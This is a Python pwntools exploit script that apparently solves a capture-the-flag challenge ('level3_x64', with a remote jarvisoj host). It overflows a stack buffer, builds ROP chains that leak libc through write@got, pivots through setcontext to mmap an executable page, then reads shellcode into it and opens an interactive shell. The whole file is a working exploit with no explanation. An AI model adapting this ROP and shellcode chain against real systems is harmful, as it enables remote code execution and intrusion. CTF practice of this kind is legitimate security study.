#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from zio import l64
import sys
context.binary = "./level3_x64"
elf = context.binary

if sys.argv[1] == "l":
    io = process("./level3_x64", env = {"LD_PRELOAD": "./libc-2.19.so"})
    #  libc = elf.libc
    libc = ELF("./libc-2.19.so", checksec = False)
else:
    io = remote("pwn2.jarvisoj.com", 9884)
    libc = ELF("./libc-2.19.so", checksec = False)

context.log_level = "debug"

def setcontext(rdi, rsi, rdx, rcx, r8, r9):
    '''
    0x7fb8be0b818f <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
    0x7fb8be0b8193 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
    0x7fb8be0b819a <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
    0x7fb8be0b81a1 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
    0x7fb8be0b81a5 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
    0x7fb8be0b81a9 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
    0x7fb8be0b81ad <setcontext+125>:	xor    eax,eax
    0x7fb8be0b81af <setcontext+127>:	ret
    '''
    payload = fit({
        0x28: l64(r8),
        0x30: p64(r9),
        0x68: p64(rdi),
        0x70: p64(rsi),
        0x88: p64(rdx),
        0x98: p64(rcx),
        }, filler = '\0')
    return payload
    

if __name__ == "__main__":
    '''
    0x00000000004006b3 : pop rdi ; ret
    0x00000000004006b1 : pop rsi ; pop r15 ; ret
    '''
    prdi = 0x00000000004006b3
    pprsi = 0x00000000004006b1

    leak  = flat(cyclic(0x80 + 8))
    leak += flat(prdi, 1, pprsi, elf.got['write'], 0, elf.plt['write'])
    leak += flat(elf.sym['_start'])
    io.sendafter("Input:\n", leak)
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['write']
    success("libc -> {:#x}".format(libc.address))
    pause()

    '''
    0x0000000000001b8e: pop rdx; ret;
    '''
    base = elf.bss() + 0x300
    prdx = libc.address + 0x0000000000001b8e

    setreg  = flat(cyclic(0x80 + 8))
    setreg += flat(prdi, 0, pprsi, base, 0, prdx, 0x400, elf.plt['read'])
    setreg += flat(prdi, base, libc.sym['setcontext'] + 95)
    setreg += flat(libc.sym['mmap'], elf.sym['_start'])
    #  raw_input("DEBUG: ")
    io.sendafter("Input:\n", setreg)
    sleep(0.01)

    io.send(setcontext(0x12345000, 0x1000, 7, 34, -1, 0))
    sleep(0.01)

    payload  = flat(cyclic(0x80 + 0x8))
    payload += flat(prdi, 0, pprsi, 0x12345000, 0, prdx, 0x400, elf.plt['read'])
    payload += flat(0x12345000)
    raw_input("DEBUG: ")
    io.sendafter("Input:\n", payload)
    sleep(0.01)

    io.send(asm(shellcraft.sh()))


    io.interactive()
